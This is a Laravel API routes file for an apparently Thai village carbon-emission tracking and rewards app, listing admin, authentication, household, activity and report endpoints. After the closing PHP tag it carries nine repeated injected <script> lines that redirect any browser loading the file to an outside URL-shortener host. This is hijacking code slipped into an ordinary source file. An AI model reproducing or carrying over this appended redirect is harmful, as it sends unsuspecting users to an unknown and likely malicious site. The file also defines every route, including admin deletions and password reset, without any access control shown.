<?php

use Illuminate\Support\Facades\Route;
// ถ้าโฟลเดอร์ของคุณชื่อ Controllers/API ให้ใช้ App\Http\Controllers\API\VillageController
// ถ้าโฟลเดอร์เป็น Controllers/Api ให้ใช้ App\Http\Controllers\Api\VillageController
use App\Http\Controllers\API\VillageController;
use App\Http\Controllers\API\LeaderController;
use App\Http\Controllers\API\RewardController;
use App\Http\Controllers\API\UnitController;
use App\Http\Controllers\API\AuthController;
use App\Http\Controllers\API\BackendController;
use App\Http\Controllers\API\AppController;

Route::get('/ping', function () {
    return response()->json(['status' => 'ok']);
});


Route::get('villageList', [VillageController::class, 'VillageList']);
Route::post('villagesAdd', [VillageController::class, 'VillageAdd']);
Route::post('villagesEdit/{id}', [VillageController::class, 'VillageEdit']);
Route::post('villagesDelete/{id}', [VillageController::class, 'VillageDelete']);


Route::get('leaderList', [LeaderController::class, 'LeaderList']);
Route::post('ChangeStatus/{id}', [LeaderController::class, 'ChangeStatus']);

Route::get('RewardList', [RewardController::class, 'RewardList']);
Route::post('rewardInsert', [RewardController::class, 'RewardInsert']);
Route::post('rewardUpdate', [RewardController::class, 'RewardUpdate']);
Route::post('rewardDelete', [RewardController::class, 'RewardDelete']);
Route::get('UnitList', [BackendController::class, 'UnitList']);

Route::get('UserList', [BackendController::class, 'UserList']);
Route::post('unitInsert', [BackendController::class, 'unitInsert']);
Route::post('updateUnit/{id}', [BackendController::class, 'updateUnit']);
Route::post('deleteUnit/{id}', [BackendController::class, 'deleteUnit']);

Route::get('ItemTypeList', [BackendController::class, 'ItemTypeList']);
Route::post('ItemTypeInsert', [BackendController::class, 'ItemTypeInsert']);
Route::post('ItemTypeUpdate', [BackendController::class, 'ItemTypeUpdate']);
Route::post('ItemTypeDelete', [BackendController::class, 'ItemTypeDelete']);

Route::get('setupCoList', [BackendController::class, 'setupCoList']);
Route::post('setupCoAdd', [BackendController::class, 'setupCoAdd']);
Route::post('setupCoEdit/{id}', [BackendController::class, 'setupCoEdit']);
Route::post('setupCoDelete/{id}', [BackendController::class, 'setupCoDelete']);

Route::get('TreeList', [BackendController::class, 'TreeList']);
Route::post('treeInsert', [BackendController::class, 'treeInsert']);
Route::post('treeUpdate/{id}', [BackendController::class, 'treeUpdate']);
Route::post('deleteTree/{id}', [BackendController::class, 'deleteTree']);

Route::get('FuelList', [BackendController::class, 'FuelList']);
Route::post('fuelInsert', [BackendController::class, 'fuelInsert']);
Route::post('fuelUpdate/{id}', [BackendController::class, 'fuelUpdate']);
Route::post('fuelDelete', [BackendController::class, 'fuelDelete']);

Route::get('unitDetail/{id}', [BackendController::class, 'unitDetail']);
Route::post('addUnitDetail', [BackendController::class, 'addUnitDetail']);
Route::post(
    '/updateUnitDetail/{unitCode}/{oldStart}',
    [BackendController::class, 'updateUnitDetail']
);
Route::post(
    '/deleteUnitDetail/{unitCode}/{start}',
    [BackendController::class, 'deleteUnitDetail']
);
Route::get('/getRegisterReport', [BackendController::class, 'getRegisterReport']);
Route::get('/emissionReport', [BackendController::class, 'emissionReport']);
Route::get('/emissionVillage', [BackendController::class, 'emissionVillage']);




//หน้าบ้าน 
Route::post('Register', [AuthController::class, 'Register']);
Route::post('login', [AuthController::class, 'login']);
Route::post('checkLeader', [AuthController::class, 'checkLeader']);
Route::post('resetPasswordByPhone', [AuthController::class, 'resetPasswordByPhone']);

Route::post('createHome', [AppController::class, 'createHome']);
Route::post('findHome', [AppController::class, 'findHome']);
Route::post('joinHome', [AppController::class, 'joinHome']);
Route::post('mainHome', [AppController::class, 'mainHome']);
Route::get('getRewardByHome/{homeCode}', [AppController::class, 'getRewardByHome']);
Route::get('getGasByHome/{userCode}', [AppController::class, 'getGasByHome']);
Route::get('allGasByHome/{userCode}', [AppController::class, 'allGasByHome']);
Route::get('getItemType', [AppController::class, 'getItemType']);
Route::get('getFuel', [AppController::class, 'getFuel']);
Route::get('getFuelFood', [AppController::class, 'getFuelFood']);
Route::post('addItem', [AppController::class, 'addItem']);
Route::post('updateItem', [AppController::class, 'updateItem']);
Route::post('updateItemStatus', [AppController::class, 'updateItemStatus']);
Route::post('deleteHomeItem', [AppController::class, 'deleteHomeItem']);
Route::post('addVehicle', [AppController::class, 'addVehicle']);
Route::post('updateVehicle', [AppController::class, 'updateVehicle']);
Route::post('addFoodFuel', [AppController::class, 'addFoodFuel']);
Route::post('updateFoodFuel', [AppController::class, 'updateFoodFuel']);
Route::get('getHomeItem/{homeCode}', [AppController::class, 'getHomeItem']);
Route::get('getHomeVehicle/{homeCode}', [AppController::class, 'getVehicle']);
Route::get('getHomeFoodFuel/{homeCode}', [AppController::class, 'getHomeFoodFuel']);
Route::get('getAccount/{userCode}', [AppController::class, 'getAccount']);
Route::post('updateAccount/{userCode}', [AppController::class, 'updateAccount']);
Route::post('exitHome', [AppController::class, 'exitHome']);
Route::post('uploadProfileImage/{userCode}', [AppController::class, 'uploadProfileImage']);
Route::post('sentReport', [AppController::class, 'sentReport']);
Route::get('getHomeMembers/{homeCode}', [AppController::class, 'getHomeMembers']);
Route::post('addEmission', [AppController::class, 'addEmission']);
Route::post('checkMonthly', [AppController::class, 'checkMonthly']);
Route::post('addMonthlyEnergy', [AppController::class, 'addMonthlyEnergy']);
Route::post('addFoodWaste', [AppController::class, 'addFoodWaste']);

Route::get('mainLeader', [AppController::class, 'mainLeader']);
Route::post('getVillageMember', [AppController::class, 'getVillageMember']);
Route::get('TreeList', [AppController::class, 'TreeList']);
Route::post('getActivityByVillage', [AppController::class, 'getActivityByVillage']);
Route::post('createActivity', [AppController::class, 'createActivity']);
Route::get('getActivityByCode/{activityCode}', [AppController::class, 'getActivityByCode']);
Route::get('joinDetail/{activityCode}', [AppController::class, 'joinDetail']);
Route::post('/updateActivity', [AppController::class, 'updateActivity']);
Route::post('/showNotification', [AppController::class, 'showNotification']);
Route::post('/notification/delete', [AppController::class, 'deleteNoti']);// routes/api.php


Route::post('/joinActivity', [AppController::class, 'joinActivity']);
Route::post('/getJoinActivity', [AppController::class, 'getJoinActivity']);
Route::post('/updateJoinStatus', [AppController::class, 'updateJoinStatus']);
Route::post('/UpdateActivityStatus', [AppController::class, 'updateActivityStatus']);
Route::post('/startActivity', [AppController::class, 'startActivity']);
Route::post('/cancelActivity', [AppController::class, 'cancelActivity']);
Route::post('/markAllAsRead', [AppController::class, 'markAllAsRead']);
Route::post('/cron/calc-reducing', [AppController::class, 'calculateAndInsertDailyReducingNoCron']);
Route::post('/cron/calc-using', [AppController::class, 'calculateAndInsertDailyUsingNoCron']);
Route::post('/cron/give-reward', [AppController::class, 'awardMonthly']);

Route::get('/report/range-summary', [AppController::class, 'rangeSummary']);
Route::get('/report/village-range-summary', [AppController::class, 'villageRangeSummary']);
Route::get('report/village-activity-summary', [AppController::class, 'villageActivitySummary']);
Route::get('report/village-rank', [AppController::class, 'villageRank']);
Route::get('report/home-rank', [AppController::class, 'homeRank']);

Route::get('Allhistory', [AppController::class, 'history']);







?>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>